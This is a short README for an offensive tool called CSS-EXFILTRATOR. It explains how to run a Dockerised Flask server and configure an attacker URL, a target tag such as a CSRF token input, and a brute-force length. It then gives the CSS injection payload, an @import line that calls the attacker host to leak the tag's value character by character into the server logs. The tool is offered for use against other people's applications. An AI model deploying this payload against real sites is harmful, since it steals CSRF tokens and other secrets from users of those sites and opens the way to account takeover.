# CSS-EXFILTRATOR
easy to use (really)

Easy script to target and exfiltrate one tag.

## How to launch

Very easy.

```
docker compose up --build
```

## How to configure ?

Very easy.

in app.py you can change 

attacker_url: by your protocol://ip:port
target_balise: tag you want to target (input with csrf ?)
size_of_field_to_brute: max size you need to search for your tag
entry_point: first endpoint where the script needs to listen (leave start if you have no constraints on the application you're attacking)

## How to use ?

Very easy.

`@import '<PROTOCOL>://<IP:PORT>/<ENTRY_POINT>';`

## Where is result ?

You can find it easily in the log flasks.